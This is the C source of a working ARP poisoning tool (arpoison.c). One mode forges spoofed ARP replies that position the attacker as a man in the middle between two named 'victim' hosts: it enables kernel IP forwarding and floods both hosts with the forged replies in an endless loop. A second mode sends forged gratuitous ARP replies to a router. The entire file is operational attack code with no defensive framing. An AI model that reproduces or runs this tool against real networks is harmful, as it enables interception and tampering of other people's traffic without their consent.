
/*-----------------------------------------------------------------------*/
/* Code file: arpoison.c                                                 */
/*                                                                       */
/* ARP-addresses spoofer for Wired LANs                                  */
/* Distributed under the terms of the GNU General Public License v2      */
/* MAC address spoofer for Switched LANs                                 */
/*-----------------------------------------------------------------------*/

//  system includes
#include <fcntl.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

//  Packet Generation framework
#include "packet_forge.h"
#include "platform.h"
#include "utils.h"

//  length of the ethernet header
#define ETH_H sizeof(struct ETHER_packet_header)
//  the broadcast address of the ARP protocol (FF:FF:FF:FF:FF:FF - 48bits)
#define ARP_BROADCAST "\ff\ff\ff\ff\ff\ff"
//  flood timer
#define TIMING_DEFAULT 2

int arp_socket, i;
//  interfaces
char *interface = NULL, *ip1 = NULL, *ip2 = NULL;
char *routerIP = NULL, *newIP = NULL, *newMAC = NULL;

//  interface descriptors
nic_info_t *victim_1 = NULL, *victim_2 = NULL, *me = NULL, *temp_str = NULL,
           *gratuitous_arp = NULL;
int timing = 0;

void title() // good old ASCII art...
{
  printf("\n" GREEN);
  printf("\t%s\n", "-------------------------------------------------");
  printf("\t%s\n", " ###   ##    ##");
  printf(YELLOW);
  printf("\t%s\n", "#   # #  #  #  #        ###                *   **");
  printf(RED);
  printf("\t%s\n", "# # # # #   # #  ##  # # #   ##  ##  #    **  *  *");
  printf(YELLOW);
  printf("\t%s\n", "#   # #  #  #   #  # #    # #  # # # #   * *  *  *");
  printf(GREEN);
  printf("\t%s\n", "#   # #   # #    ##  # ###   ##  #  ## ==  * . **");
  printf("\t%s\n", "-------------------------------------------------");
  printf(RESET "\n");
}

void print_syntax(char *name) {
  printf("%s\n", "Version 1.0 FINAL -- ARP Poisoner\n");
  printf("Syntax: %s [options] params\n", name);
  printf("%s\n", "  -i <int>: sets the interface to use to flood the net");
  printf("%s\n", "  -m <mode>: Operation mode: 0 is ARP Poison mode, 1 is "
                 "Gratuitous ARP mode");
  printf("%s\n", "  -t <millisec>: tunes the flood timing");
  printf("%s\n",
         "If in ARP poison mode, PARAMS are: <victim1 IP> <victim2 IP>\nIf in "
         "Gratuitous ARP mode, PARAMS are: <Router IP> <New IP> <New MAC>.\n");
  printf("%s\n", "\n");
  exit(-1);
}

/*  ip_forward()
  checks if the ip_forward kernel feature is turned on or off and negates its
  state
*/
void ip_forward(int on_off) {
  printf("[" YELLOW "Init" RESET "]: Checking kernel IP_FORWARD status\n");

  int ip_f = platform_get_ip_forward();
  if (ip_f < 0) {
    die("Cannot determine IP forwarding status on this system.\n");
  }

  if (on_off == 1) {
    if (ip_f == 0) {
      printf("[" YELLOW "Core" RESET "]: kernel ip_forward disabled...\n");
      printf("[" YELLOW "Core" RESET "]: Enabling kernel IP_FORWARD...\n");
      if (platform_set_ip_forward(1) < 0) {
        die("Failed to enable IP forwarding.\n");
      }
      printf("[" YELLOW "Core" RESET "]: kernel ip_forward ENABLED\n");
    } else {
      printf("[" YELLOW "Core" RESET "]: kernel ip_forward = %d (ENABLED)\n",
             ip_f);
    }
  } else {
    if (ip_f == 1) {
      printf("[" YELLOW "Core" RESET "]: kernel ip_forward enabled...\n");
      printf("[" YELLOW "Core" RESET "]: Disabling kernel IP_FORWARD...\n");
      if (platform_set_ip_forward(0) < 0) {
        die("Failed to disable IP forwarding.\n");
      }
      printf("[" YELLOW "Core" RESET "]: kernel ip_forward DISABLED\n");
    }
  }
}

void program_init(char *IP, char *IP2) {
  //  Retrieving ARP address of the victim  hosts
  printf("\n");
  printf("[" YELLOW "Init" RESET "]: Searching MAC for HOST: " BLUE "{%s}" RESET
         "\n",
         IP);
  //  sometimes arp resolution is flaky.. make 3 requests just in case
  force_arp(inet_addr(IP));
  force_arp(inet_addr(IP));
  force_arp(inet_addr(IP));
  printf("[" YELLOW "Init" RESET "]: Searching MAC for HOST: " BLUE "{%s}" RESET
         "\n",
         IP2);
  //  Idem
  force_arp(inet_addr(IP2));
  force_arp(inet_addr(IP2));
  force_arp(inet_addr(IP2));
  sleep(1);
}

/*
 * sig_exit():
 * exit signal hijacker
 */
void sig_exit(int sig) {
  printf(RED);
  printf("\n[Core]: SIGNAL RECEIVED (timestamp %s): Shutting down...\n",
         getTimestamp());
  printf(RESET);
  /*if (ip2 != NULL)
  {
    free(ip2);
  }
  if (ip1 != NULL)
  {
    free(ip1);
  }*/ // managed by getopt
  if (temp_str != NULL) {
    free(temp_str);
  }

  if (gratuitous_arp != NULL) {
    free(gratuitous_arp);
  }
  platform_close_raw(arp_socket);
  ip_forward(0);
  printf(BLUE);
  printf("Cleanup completed, shutting down...\n");
  printf(RESET);

  exit(-1);
}

//  Segmentation fault action handler
void segv_handler(int sig) {
  printf(RED);
  printf("\n[Core]: [.::APPLICATION SUICIDE::.] GOT SIGSEGV [segmentation "
         "fault] (timestamp %s)\n",
         getTimestamp());
  printf(RESET);
  /*if (ip2 != NULL)
  {
    free(ip2);
  }
  if (ip1 != NULL)
  {
    free(ip1);
  }*/ // managed by getopt
  if (temp_str != NULL) {
    free(temp_str);
  }

  if (gratuitous_arp != NULL) {
    free(gratuitous_arp);
  }
  if (arp_socket > 0)
    platform_close_raw(arp_socket);

  ip_forward(0);
  printf(BLUE);
  printf(RESET);
  printf(BLUE);
  printf("Unexpected program failure. Shutdown completed.\n");
  printf(RESET);
  sleep(1);

  exit(-1);
}

/*-----------------------------------------------------------------------+
|  MAIN ROUTINE: entry point                                             |
+-----------------------------------------------------------------------*/

int main(int argc, char **argv) {
  struct sigaction sa;
  memset(&sa, 0, sizeof(sa));
  sa.sa_handler = &segv_handler;
  int choice = 0;
  int mode = 0;

  if (getuid() != 0) {
    printf("\n[" YELLOW "Core" RESET "]: Cannot start up the program: You need "
           "ROOT privileges. (timestamp: %s)\n\n",
           getTimestamp());
    exit(-1);
  }

  // wow
  title();

  // parse cmdline
  while ((choice = getopt(argc, argv, "i:t:m:")) != -1) {
    switch (choice) {
    case 'i':
      interface = optarg;
      break;
    case 't':
      timing = atoi(optarg);
      break;
    case 'm':
      mode = atoi(optarg);
      break;
    case '?':
      print_syntax(argv[0]);
      exit(-1);
    default:
      print_syntax(argv[0]);
      exit(-1);
    }
  }

  printf("[+] Options: timing %d secs, interface %s.\n", timing, interface);
  if (mode) {
    printf("%s\n", "[" YELLOW "Core" RESET "]: Hijacking signal handlers...");
    signal(SIGINT, sig_exit);
    signal(SIGTERM, sig_exit);
    signal(SIGHUP, sig_exit);

    printf("%s\n", "[" YELLOW "Core" RESET
                   "]: Registering signal action for SIGSEGV...");
    sigaction(SIGSEGV, &sa, NULL);

    printf("[+] OP Mode: GRATUITOUS ARP MODE\n");

    // parse options
    if ((optind + 2) < argc) {
      routerIP = argv[optind];
      newIP = argv[optind + 1];
      newMAC = argv[optind + 2];
    } else {
      printf("%s\n", "Missing Parameter.");
      raise(SIGTERM);
    }

    // build up descriptor for the gratuitous arp packet...
    gratuitous_arp = new_nic_info_t(newIP, newMAC);
    printf("[" YELLOW "Core" RESET "]: New IP: " BLUE "{%s}" RESET
           " - New MAC: " BLUE "{%s}" RESET "...\n",
           smart_IP_to_char(ntohl(gratuitous_arp->ip_address)),
           gratuitous_arp->mac_address_string);

    // gather info on target router...
    temp_str = get_peer_hw_addr(interface, routerIP);
    if (temp_str == NULL) {
      temp_str = get_peer_hw_addr(interface, routerIP);
      sleep(1);
      temp_str = get_peer_hw_addr(interface, routerIP); // just in case:)
      if (temp_str == NULL) {
        ip_forward(0);
        die("SIOCGIFHWADDR failed for host %s!!! [NON FATAL: Restart "
            "application] \n",
            routerIP);
      }
    }

    // this is me...
    me = get_hw_addr(interface);

    // build gratuitous arp packet...
    printf("[" YELLOW "Core" RESET "]: NEW IP " BLUE "{%s}" RESET " is-at " BLUE
           "{%s}" RESET "...\n",
           smart_IP_to_char(ntohl(gratuitous_arp->ip_address)),
           gratuitous_arp->mac_address_string);
    printf("[" YELLOW "Core" RESET
           "]: Generating Ethernet Frame and ARP packet "
           "for New Host...\n");
    u_char packet_IP1[60];
    memset(packet_IP1, 0, 60);
    //  forging a valid ETHERNET HEADER
    ether_forgery(ETH_P_ARP, me->mac_address, temp_str->mac_address,
                  packet_IP1);

    //  filling the payload with fake ARP info
    arp_forgery(ARPHRD_ETHER, ETHER_ADDR_LEN, sizeof(in_addr_t),
                gratuitous_arp->mac_address, temp_str->mac_address,
                (unsigned char *)&gratuitous_arp->ip_address,
                (unsigned char *)&temp_str->ip_address, ARPOP_REPLY,
                (unsigned char *)(packet_IP1 + ETH_H));

    free(me);

    // open socket
    printf("[" YELLOW "Core" RESET "]: Opening raw packet socket...\n");
    arp_socket = platform_open_raw_socket(interface);

    if (arp_socket < 0) {
      printf("\n[" YELLOW "Core" RESET "]: " RED "SOCKET INIT ERROR!!" RESET
             "\n");
      raise(SIGTERM);
    }

    printf("\n[" YELLOW "Core" RESET "]: " RED "GRATUITOUS ARP INIT" RESET
           "\n");

    // send 3 packets...
    for (int arps = 0; arps < 3; arps++) // ARP update loop
    {
      // Send packet
      printf("[" YELLOW "Core" RESET "]: ARP-updating(%d): " BLUE "{%s}" RESET
             " "
             "<----> " BLUE "{%s}" RESET ", target MAC is {%s}\n",
             arps, newIP, gratuitous_arp->mac_address_string,
             temp_str->mac_address_string);
      i = platform_send_raw(arp_socket, packet_IP1, sizeof(packet_IP1),
                            interface);

      if (i != sizeof(packet_IP1)) {
        printf("[" YELLOW "Core" RESET "]: Error writing to the socket. "
               "(arp_socket)\n");
        raise(SIGTERM);
      }

      sleep(1);
    }

    // exit sw.
    raise(SIGTERM);

  } else {
    printf("%s\n", "[" YELLOW "Core" RESET "]: Hijacking signal handlers...");
    signal(SIGINT, sig_exit);
    signal(SIGTERM, sig_exit);
    signal(SIGHUP, sig_exit);

    printf("%s\n", "[" YELLOW "Core" RESET
                   "]: Registering signal action for SIGSEGV...");
    sigaction(SIGSEGV, &sa, NULL);

    printf("[+] OP Mode: ARP POISON\n");
    timing = timing / 1000;
    if (timing < 1) {
      printf("[" YELLOW "Core" RESET "]: Cannot handle timings lower than 2000 "
             "msec, setting default\n");
      timing = TIMING_DEFAULT;
    }

    //  enable IP FORWARD
    ip_forward(1);

    // parse options
    if ((optind + 1) < argc) {
      ip1 = argv[optind];
      ip2 = argv[optind + 1];
    } else {
      raise(SIGTERM);
    }

    victim_1 = (nic_info_t *)malloc(sizeof(nic_info_t));
    victim_2 = (nic_info_t *)malloc(sizeof(nic_info_t));

    //  OK, fire things up
    printf("[" YELLOW "Core" RESET "]: Application Startup (timestamp: %s)\n",
           getTimestamp());

    printf("%s\n", "[" YELLOW "Core" RESET "]: Gathering network infos ...");
    program_init(ip1, ip2);

    printf("%s\n",
           "\n[" YELLOW "Core" RESET "]: Generating nic_info_t strutures...");
    me = get_hw_addr(interface);

    if (me == NULL) {
      printf("[" PURPLE "Core" RESET
             "] Error gathering info from device [%s].\n",
             interface);
      printf("[" PURPLE "Core" RESET
             "] [%s]: this basically can mean anything, "
             "from a mistyped name to an interface in DOWN state.\n",
             interface);
      raise(SIGTERM);
    }

    printf("[" YELLOW "Core" RESET "]: Local IP: " BLUE "{%s}" RESET " - Local "
           "MAC: " BLUE "{%s}" RESET "...\n",
           smart_IP_to_char(ntohl(me->ip_address)), me->mac_address_string);

    // gathering infos on host 1
    temp_str = get_peer_hw_addr(interface, ip1);
    if (temp_str == NULL) {
      temp_str = get_peer_hw_addr(interface, ip1);
      sleep(1);
      temp_str = get_peer_hw_addr(interface, ip1); // just in case:)
      if (temp_str == NULL) {
        ip_forward(0);
        die("SIOCGIFHWADDR failed for host %s!!! [NON FATAL: Restart "
            "application] \n",
            ip1);
      }
    }

    memcpy(victim_1, temp_str, sizeof(nic_info_t));
    free(temp_str);

    // gathering infos on host 1
    temp_str = get_peer_hw_addr(interface, ip2);
    if (temp_str == NULL) {
      temp_str = get_peer_hw_addr(interface, ip2);
      sleep(1);
      temp_str = get_peer_hw_addr(interface, ip2); // just in case:)
      if (temp_str == NULL) {
        ip_forward(0);
        die("SIOCGIFHWADDR failed for host %s!!! [NON FATAL: Restart "
            "application] \n",
            ip2);
      }
    }

    memcpy(victim_2, temp_str, sizeof(nic_info_t));
    free(temp_str);

    temp_str = NULL;

    //  Generating the EvIl packet for host 1
    printf("[" YELLOW "Core" RESET "]: IP " BLUE "{%s}" RESET " is-at " BLUE
           "{%s}" RESET "...\n",
           smart_IP_to_char(ntohl(victim_1->ip_address)),
           victim_1->mac_address_string);
    printf("[" YELLOW "Core" RESET
           "]: Generating Ethernet Frame and ARP packet "
           "for host 1...\n");
    u_char packet_IP1[60];
    memset(packet_IP1, 0, 60);
    //  forging a valid ETHERNET HEADER
    ether_forgery(ETH_P_ARP, me->mac_address, victim_1->mac_address,
                  packet_IP1);

    //  filling the payload with fake ARP info
    arp_forgery(ARPHRD_ETHER, ETHER_ADDR_LEN, sizeof(in_addr_t),
                me->mac_address, victim_1->mac_address,
                (unsigned char *)&victim_2->ip_address,
                (unsigned char *)&victim_1->ip_address, ARPOP_REPLY,
                (unsigned char *)(packet_IP1 + ETH_H));

    //  forging cleanup packet for host 1..
    u_char packet_cleanup1[60];
    memset(packet_cleanup1, 0, 60);

    ether_forgery(ETH_P_ARP, me->mac_address, victim_1->mac_address,
                  packet_cleanup1);

    arp_forgery(ARPHRD_ETHER, ETHER_ADDR_LEN, sizeof(in_addr_t),
                victim_2->mac_address, victim_1->mac_address,
                (unsigned char *)&victim_2->ip_address,
                (unsigned char *)&victim_1->ip_address, ARPOP_REPLY,
                (unsigned char *)(packet_cleanup1 + ETH_H));

    // forging packet for host 2
    printf("[" YELLOW "Core" RESET "]: IP " BLUE "{%s}" RESET " is-at " BLUE
           "{%s}" RESET "...\n",
           smart_IP_to_char(ntohl(victim_2->ip_address)),
           victim_2->mac_address_string);
    printf("[" YELLOW "Core" RESET
           "]: Generating Ethernet Frame and ARP packet "
           "for host 2...\n");
    u_char packet_IP2[60];
    memset(packet_IP2, 0, 60);

    ether_forgery(ETH_P_ARP, me->mac_address, victim_2->mac_address,
                  packet_IP2);

    arp_forgery(ARPHRD_ETHER, ETHER_ADDR_LEN, sizeof(in_addr_t),
                me->mac_address, victim_2->mac_address,
                (unsigned char *)&victim_1->ip_address,
                (unsigned char *)&victim_2->ip_address, ARPOP_REPLY,
                (packet_IP2 + ETH_H));

    // forging cleanup packet for host 2..
    u_char packet_cleanup2[60];
    memset(packet_cleanup2, 0, 60);

    ether_forgery(ETH_P_ARP, me->mac_address, victim_2->mac_address,
                  packet_cleanup2);

    arp_forgery(ARPHRD_ETHER, ETHER_ADDR_LEN, sizeof(in_addr_t),
                victim_1->mac_address, victim_2->mac_address,
                (unsigned char *)&victim_1->ip_address,
                (unsigned char *)&victim_2->ip_address, ARPOP_REPLY,
                (unsigned char *)(packet_cleanup2 + ETH_H));

    printf("[" YELLOW "Core" RESET "]: Opening raw packet socket...\n");
    arp_socket = platform_open_raw_socket(interface);

    if (arp_socket < 0) {
      printf("\n[" YELLOW "Core" RESET "]: " RED "SOCKET INIT ERROR!!" RESET
             "\n");
      raise(SIGTERM);
    }

    printf("\n[" YELLOW "Core" RESET "]: " RED "MAN IN THE MIDDLE INIT" RESET
           "\n");
    printf("[" YELLOW "Core" RESET "]: ARP-fooling: " BLUE "{%s}" RESET
           " <----> " BLUE "{%s}" RESET " <----> " BLUE "{%s}" RESET "\n",
           ip1, smart_IP_to_char(ntohl(me->ip_address)), ip2);
    printf("[" YELLOW "Core" RESET "]: ARP-fooling: " BLUE "{%s}" RESET
           " <----> " BLUE "{%s}" RESET " <----> " BLUE "{%s}" RESET "\n",
           victim_1->mac_address_string, me->mac_address_string,
           victim_2->mac_address_string);

    // free unused variables
    free(victim_2);
    free(victim_1);
    victim_1 = NULL;
    victim_2 = NULL;

    // sanity checks
    free(me);
    me = NULL;

    for (;;) // ARP spoofing loop, terminate with CTRL-C
    {
      // ARPing to HOST 1
      i = platform_send_raw(arp_socket, packet_IP1, sizeof(packet_IP1),
                            interface);

      if (i != sizeof(packet_IP1)) {
        printf("[" YELLOW "Core" RESET
               "]: Error writing to the socket!!! (1)\n");
        raise(SIGTERM);
      }

      if (timing != 0)
        sleep(timing / 2); // flooding time
      else
        sleep(TIMING_DEFAULT / 2);

      // ARPing to HOST 2
      i = platform_send_raw(arp_socket, packet_IP2, sizeof(packet_IP2),
                            interface);

      if (i != sizeof(packet_IP2)) {
        printf("[" YELLOW "Core" RESET
               "]: Error writing to the socket!!! (1)\n");
        raise(SIGTERM);
      }

      if (timing != 0)
        sleep(timing / 2); // flooding time
      else
        sleep(TIMING_DEFAULT / 2);
    }
  }
}

/*-- ARPOISON.C -- =EOF= --*/
